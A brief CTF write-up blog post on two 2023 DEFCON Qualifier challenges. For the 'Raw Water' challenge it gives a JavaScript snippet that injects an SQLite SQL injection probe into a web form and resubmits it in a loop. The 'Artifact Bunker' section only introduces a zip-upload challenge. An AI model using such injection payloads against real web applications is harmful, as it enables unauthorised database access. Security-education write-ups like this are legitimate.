---
layout:     post
title:      DEFCON CTF Qualifier
subtitle:   2023
date:       2023-06-05
author:     lyk
header-img: img/post-bg-cook.jpg
catalog: true
tags:
    - Writeup
---

# Raw Water

sqlite sql注入

它的表单要填的有点多

上jio本

```js
const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
document.querySelector('input').value = "'|| sqlite_version() || '";
for (;;) {
  [...document.querySelectorAll("input")].forEach(
    (i) => (i.value ||= "1")
  );
  document.querySelector("main > form > button").click();
  await wait(500);
  if (new URL(location.href).pathname.startsWith("/orders/")) {
    break;
  }
}
```



# Artifact Bunker

A web interface and something with uploading zips! 
After long hours of waiting, `artifact bunker` finally presents the first web-challenge in the defcon qualifiers! So let's dive straight in and see what this thing does.
[Link to challenge](https://github.com/Nautilus-Institute/quals-2023/tree/main/artifact-bunker) (with Dockerfile!) 

